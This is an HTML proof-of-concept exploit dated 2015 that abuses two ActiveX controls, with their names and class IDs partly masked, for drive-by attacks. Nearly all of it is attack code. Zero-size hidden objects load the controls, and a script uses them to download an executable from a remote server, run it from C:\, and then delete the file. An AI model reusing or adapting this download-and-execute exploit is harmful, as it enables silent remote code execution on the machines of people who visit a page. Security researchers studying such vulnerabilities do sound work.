<HTML>
<HEAD>
<TITLE>Arbitrary file download and execution exploit</TITLE>
<!--

 - Title: Arbitrary file download and execution exploit by E**_****.ocx and Http**********.ocx
 - Date: 2015.03.02
 - Author: 1ndr4

//-->
</HEAD>
<BODY>
<object classid="clsid:********-****-****-****-************" width=0 height=0 id="launcher"></object>
<object classid="clsid:********-****-****-****-************" width=0 height=0 id="downloader"></object>
<script>
var server = "210.***.***.130";
var port = 80;
var filepath = "/MessageBox.exe";
var savepath = "C:\\poc.exe";
var exists = 0;

if(launcher == null || downloader == null ) {
	alert("Can't load objects");
} else {
	// * Download
	downloader.FileDownload(server, port, "", "", filepath, savepath);

	// * Execution
	launcher.OpenFile(savepath);

	// * Delete
	// XXX: if returned 1, it means exists the file.
	while((launcher.exitsFile(savepath)) == 1) {
		launcher.DeleteDirectoryWithFile(savepath);
	}
}
</script>
</BODY>
</HTML>
